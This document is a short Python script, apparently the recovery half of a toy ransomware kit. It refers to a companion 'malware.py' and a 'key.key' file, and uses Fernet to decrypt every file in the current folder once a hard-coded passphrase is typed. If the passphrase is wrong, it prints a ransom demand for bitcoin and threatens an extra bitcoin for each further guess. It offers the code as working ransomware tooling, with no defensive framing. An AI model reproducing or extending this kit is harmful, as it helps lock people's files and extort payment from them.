#!usr/bin/env python3

# Author yxp5 >:)

import os
import time
from cryptography.fernet import Fernet

files = []
skipped = ["malware.py", "recover.py", "key.key", "print.py"]

for file in os.listdir():
	if file in skipped: continue
	else: files.append(file)

keyfile = open("key.key", "rb")
key = keyfile.read()

usercode = input("Enter the code: ")
realcode = "MAGA for the win"

if usercode == realcode:
	print("Good... I hope you learned your lesson.\n")
	time.sleep(1)
	for file in files:
		print(f"Decrypting {file}...\n")
		fp = open(file, "rb")
		content = fp.read()
		decryption = Fernet(key).decrypt(content)
		
		fp = open(file, "wb")
		fp.write(decryption)
		time.sleep(1)
else:
	print("Wrong code! You need to pay me bitcoin to get code\n")
	time.sleep(1)
	print("For each wrong input, you need to pay me 1 more bitcoin for trying to guess the code!\n")
	exit()

print("Decryption done!\n")
time.sleep(1)
print("Enjoy getting your files back!\n")

